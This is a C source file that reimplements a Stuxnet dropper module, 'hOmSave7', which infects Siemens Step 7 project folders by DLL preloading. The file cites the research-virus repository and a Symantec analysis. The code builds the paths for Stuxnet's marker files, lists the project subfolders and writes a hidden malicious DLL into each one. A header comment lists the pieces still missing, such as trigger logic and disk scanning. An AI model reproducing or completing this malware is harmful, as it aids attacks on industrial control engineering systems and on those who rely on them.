/* Warning: Missing critical capabilities:
 
1. No trigger‑logic for DLL‑preloading hijacking: There is no code to monitor Step‑7 application events and fire the DLL‑hijack when a  .s7p  project file gets opened. The module can place a malicious DLL on disk but cannot force Step‑7 to load and execute it.
​
2. No automated full‑disk scanning logic: Cannot automatically traverse the filesystem to discover existing Siemens Step‑7 project folders. It must be invoked by external higher‑level‑orchestration code with explicit project‑path input.
​
3. No upstream‑calling‑chain integration: Stand‑alone utility library with no upper‑level invocation glue‑code. It depends entirely on other external modules to feed payload‑buffers and drive its workflow.
​
4. No logic for post‑infection state‑tracking, cleanup or rollback of planted artefacts

 * dropper/8. hOmSave7.c
 * Stuxnet hOmSave7 - Step 7 Project DLL Preloading Infection Module
 *
 * Based on research-virus/stuxnet (Christian Roggia)
 * https://github.com/research-virus/stuxnet
 *
 * Reference: Symantec "Stuxnet Infection of Step 7 Projects" (2010-09-27)
 * https://www.symantec.com/connect/blogs/stuxnet-infection-step-7-projects
 */

#include <windows.h>
#include <stdio.h>

#define STUXNET_MAGIC           0x53545558

#define HOMSAVE7_DIR            L"hOmSave7"
#define HOMSAVE7_DLL_NAME       L"xyz.dll"

#define HOMSAVE7_MAX_PATH       260
#define HOMSAVE7_BUFFER_SIZE    4096

/* Xutils paths - used to locate the encrypted main DLL */
#define XUTILS_LISTEN_DIR       L"XUTILS\\listen"
#define XR000000_MDX            L"XR000000.MDX"
#define XUTILS_LINKS_DIR        L"XUTILS\\links"
#define S7P00001_DBF            L"S7P00001.DBF"
#define S7000001_MDX            L"S7000001.MDX"

/* Search order for DLL preloading */
#define SEARCH_S7BIN            0
#define SEARCH_SYSTEM           1
#define SEARCH_WINDIR_SYSTEM    2
#define SEARCH_WINDIR           3
#define SEARCH_HOMSAVE7         4


typedef struct _HOMSAVE7_CONTEXT {
    DWORD   dwMagic;
    WCHAR   szProjectPath[HOMSAVE7_MAX_PATH];
    WCHAR   szHOmSave7Path[HOMSAVE7_MAX_PATH];
    WCHAR   szDllPath[HOMSAVE7_MAX_PATH];
    WCHAR   szXutilsListenPath[HOMSAVE7_MAX_PATH];
    WCHAR   szXutilsLinksPath[HOMSAVE7_MAX_PATH];
    WCHAR   szXR000000[HOMSAVE7_MAX_PATH];
    WCHAR   szS7000001[HOMSAVE7_MAX_PATH];
    WCHAR   szS7P00001[HOMSAVE7_MAX_PATH];
    DWORD   dwSubfolderCount;
    DWORD   dwDroppedCount;
    CRITICAL_SECTION csLock;
} HOMSAVE7_CONTEXT, * PHOMSAVE7_CONTEXT;

static HOMSAVE7_CONTEXT g_HOmSave7Ctx = {0};
static const WCHAR* g_SearchOrder[] = {
    L"S7BIN",
    L"%System%",
    L"%Windir%\\system",
    L"%Windir%",
    L"hOmSave7 subfolders"
};


DWORD HOmSave7_Initialize(VOID)
{
    if (g_HOmSave7Ctx.dwMagic == STUXNET_MAGIC) {
        return 0;
    }

    ZeroMemory(&g_HOmSave7Ctx, sizeof(HOMSAVE7_CONTEXT));
    InitializeCriticalSection(&g_HOmSave7Ctx.csLock);
    g_HOmSave7Ctx.dwMagic = STUXNET_MAGIC;

    return 0;
}


DWORD HOmSave7_Cleanup(VOID)
{
    if (g_HOmSave7Ctx.dwMagic != STUXNET_MAGIC) {
        return -1;
    }

    DeleteCriticalSection(&g_HOmSave7Ctx.csLock);
    ZeroMemory(&g_HOmSave7Ctx, sizeof(HOMSAVE7_CONTEXT));

    return 0;
}


DWORD HOmSave7_SetProjectPath(LPCWSTR lpProjectPath)
{
    if (!lpProjectPath) {
        return -1;
    }

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    wcscpy_s(g_HOmSave7Ctx.szProjectPath, HOMSAVE7_MAX_PATH, lpProjectPath);

    wsprintfW(g_HOmSave7Ctx.szHOmSave7Path, L"%s\\%s",
              lpProjectPath, HOMSAVE7_DIR);

    wsprintfW(g_HOmSave7Ctx.szXutilsListenPath, L"%s\\%s",
              lpProjectPath, XUTILS_LISTEN_DIR);
    wsprintfW(g_HOmSave7Ctx.szXutilsLinksPath, L"%s\\%s",
              lpProjectPath, XUTILS_LINKS_DIR);

    wsprintfW(g_HOmSave7Ctx.szXR000000, L"%s\\%s",
              g_HOmSave7Ctx.szXutilsListenPath, XR000000_MDX);
    wsprintfW(g_HOmSave7Ctx.szS7000001, L"%s\\%s",
              g_HOmSave7Ctx.szXutilsListenPath, S7000001_MDX);
    wsprintfW(g_HOmSave7Ctx.szS7P00001, L"%s\\%s",
              g_HOmSave7Ctx.szXutilsLinksPath, S7P00001_DBF);

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return 0;
}


DWORD HOmSave7_EnumerateSubfolders(LPWSTR lpFolderList, DWORD dwBufferSize, PDWORD pdwCount)
{
    WCHAR szSearchPath[HOMSAVE7_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    DWORD dwIndex;

    if (!lpFolderList || dwBufferSize == 0 || !pdwCount) {
        return -1;
    }

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    wsprintfW(szSearchPath, L"%s\\*", g_HOmSave7Ctx.szHOmSave7Path);

    hFind = FindFirstFileW(szSearchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_HOmSave7Ctx.csLock);
        return -1;
    }

    dwIndex = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
                if (dwIndex < dwBufferSize / sizeof(WCHAR) / HOMSAVE7_MAX_PATH) {
                    wcscpy_s(&lpFolderList[dwIndex * HOMSAVE7_MAX_PATH],
                             HOMSAVE7_MAX_PATH, fd.cFileName);
                    dwIndex++;
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));

    FindClose(hFind);

    g_HOmSave7Ctx.dwSubfolderCount = dwIndex;
    *pdwCount = dwIndex;

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return 0;
}


DWORD HOmSave7_DropDllInSubfolder(LPCWSTR lpSubfolder, PBYTE pDllData, DWORD dwDllSize)
{
    WCHAR szDllPath[HOMSAVE7_MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;

    if (!lpSubfolder || !pDllData || dwDllSize == 0) {
        return -1;
    }

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    wsprintfW(szDllPath, L"%s\\%s\\%s",
              g_HOmSave7Ctx.szHOmSave7Path, lpSubfolder, HOMSAVE7_DLL_NAME);

    hFile = CreateFileW(szDllPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LeaveCriticalSection(&g_HOmSave7Ctx.csLock);
        return -1;
    }

    WriteFile(hFile, pDllData, dwDllSize, &dwWritten, NULL);
    CloseHandle(hFile);

    g_HOmSave7Ctx.dwDroppedCount++;

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return 0;
}


DWORD HOmSave7_GetDllPath(LPCWSTR lpSubfolder, LPWSTR lpDllPath, DWORD dwPathSize)
{
    if (!lpSubfolder || !lpDllPath || dwPathSize == 0) {
        return -1;
    }

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    wsprintfW(lpDllPath, L"%s\\%s\\%s",
              g_HOmSave7Ctx.szHOmSave7Path, lpSubfolder, HOMSAVE7_DLL_NAME);

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return 0;
}


BOOL HOmSave7_IsDllPresent(LPCWSTR lpSubfolder)
{
    WCHAR szDllPath[HOMSAVE7_MAX_PATH];
    DWORD dwAttrib;

    if (!lpSubfolder) {
        return FALSE;
    }

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    wsprintfW(szDllPath, L"%s\\%s\\%s",
              g_HOmSave7Ctx.szHOmSave7Path, lpSubfolder, HOMSAVE7_DLL_NAME);

    dwAttrib = GetFileAttributesW(szDllPath);

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}


BOOL HOmSave7_IsPresent(VOID)
{
    DWORD dwAttrib;

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    dwAttrib = GetFileAttributesW(g_HOmSave7Ctx.szHOmSave7Path);

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
            (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}


LPCWSTR HOmSave7_GetPath(VOID)
{
    return g_HOmSave7Ctx.szHOmSave7Path;
}


LPCWSTR HOmSave7_GetDllName(VOID)
{
    return HOMSAVE7_DLL_NAME;
}


DWORD HOmSave7_GetSubfolderCount(VOID)
{
    return g_HOmSave7Ctx.dwSubfolderCount;
}


DWORD HOmSave7_GetDroppedCount(VOID)
{
    return g_HOmSave7Ctx.dwDroppedCount;
}


LPCWSTR HOmSave7_GetXR000000Path(VOID)
{
    return g_HOmSave7Ctx.szXR000000;
}


LPCWSTR HOmSave7_GetS7000001Path(VOID)
{
    return g_HOmSave7Ctx.szS7000001;
}


LPCWSTR HOmSave7_GetS7P00001Path(VOID)
{
    return g_HOmSave7Ctx.szS7P00001;
}


LPCWSTR HOmSave7_GetSearchOrderString(DWORD dwIndex)
{
    if (dwIndex > SEARCH_HOMSAVE7) {
        return NULL;
    }
    return g_SearchOrder[dwIndex];
}


DWORD HOmSave7_GetSearchOrderCount(VOID)
{
    return SEARCH_HOMSAVE7 + 1;
}


VOID HOmSave7_PrintSearchOrder(VOID)
{
    DWORD i;

    EnterCriticalSection(&g_HOmSave7Ctx.csLock);

    for (i = 0; i <= SEARCH_HOMSAVE7; i++) {
        OutputDebugStringW(L"[HOMSAVE7] Search order: ");
        OutputDebugStringW(g_SearchOrder[i]);
        OutputDebugStringW(L"\n");
    }

    LeaveCriticalSection(&g_HOmSave7Ctx.csLock);
}
